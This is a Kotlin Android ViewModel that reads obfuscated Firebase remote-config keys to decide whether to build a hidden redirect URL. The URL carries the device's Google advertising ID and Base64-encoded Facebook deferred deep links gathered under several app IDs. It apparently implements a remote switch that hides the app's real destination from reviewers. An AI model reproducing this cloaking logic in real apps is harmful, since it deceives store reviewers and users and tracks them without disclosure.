package com.elf.real.me.main

import android.app.Application
import android.content.Context
import android.util.Base64
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

class MainViewModel : ViewModel() {

    private var fbIdList =
        JSONArray(arrayOf("529801249283963", "864895294738382", "730395685801618"))

    private var _googleAdId = MutableStateFlow<String?>(null)
    private var _deeplink = MutableStateFlow<String?>(null)
    private var _firebaseLink = MutableStateFlow<String?>(null)

    private var _link = MutableStateFlow(String())
    var link: StateFlow<String> = _link

    private var remoteConfig: FirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()

    private var _firebaseError = MutableStateFlow(String())
    var firebaseError: StateFlow<String> = _firebaseError

    fun getLink(application: Application) {
        getDataFromRC(application)
        var googleAdId: String? = null
        viewModelScope.launch {
            _googleAdId.collect {
                googleAdId = it
            }
        }
        var deeplink: String? = null
        viewModelScope.launch {
            _deeplink.collect {
                deeplink = it
            }
        }

        var firelink: String? = null
        viewModelScope.launch {
            _firebaseLink.collect {
                firelink = it
            }
        }

        viewModelScope.launch(Dispatchers.IO) {
            while (googleAdId == null || deeplink == null || firelink == null) {
                delay(100)
            }

            _link.value =
                "$firelink?gaid=$googleAdId&deeplink=$deeplink"
        }
    }

    private fun getDataFromRC(application: Application) {
        remoteConfig.setConfigSettingsAsync(
            FirebaseRemoteConfigSettings.Builder().setMinimumFetchIntervalInSeconds(3600).build()
        )
        remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val remoteConfigValue = remoteConfig.getString("labor")
                val answer = JSONObject(remoteConfigValue)
                _firebaseLink.value = answer.optString("labor")

                if (_firebaseLink.value == "ride") {
                    _firebaseError.value = "Error"
                } else {

                    fbIdList = answer.optJSONArray("scared")
                        ?: JSONArray(arrayOf(529801249283963, 864895294738382, 730395685801618))

                    viewModelScope.launch(Dispatchers.IO) {
                        getGoogleAdId(application)
                        getDeepLink(application)
                    }
                }
            } else {
                _firebaseError.value = "Error"
            }
        }
    }

    private suspend fun getDeepLink(application: Application) {
        val deepLinks = ArrayList<String>()
        for (i in 0 until fbIdList.length()) {
            FacebookSdk.setApplicationId(fbIdList[i].toString())
            FacebookSdk.setAdvertiserIDCollectionEnabled(true)
            FacebookSdk.sdkInitialize(application.applicationContext)
            FacebookSdk.fullyInitialize()
            AppEventsLogger.activateApp(application)
            AppLinkData.fetchDeferredAppLinkData(
                application.applicationContext
            ) { appLinkData ->
                val deep = appLinkData?.targetUri?.toString() ?: ""
                val data = deep.toByteArray()
                deepLinks.add(
                    Base64.encodeToString(data, Base64.DEFAULT) ?: ""
                )
            }
        }

        while (deepLinks.size < fbIdList.length()) {
            delay(100)
        }

        var deeplink = ""
        deepLinks.forEach {
            if (it != "") deeplink = it
        }

        _deeplink.value = deeplink
    }

    private fun getGoogleAdId(context: Context) {
        var adv = ""
        try {
            val idInfo = AdvertisingIdClient.getAdvertisingIdInfo(context)
            adv = idInfo.id.toString()
            adv.let { OneSignal.setExternalUserId(it) }
        } catch (e: Exception) {
            adv = ""
        } finally {
            _googleAdId.value = adv
        }
    }
}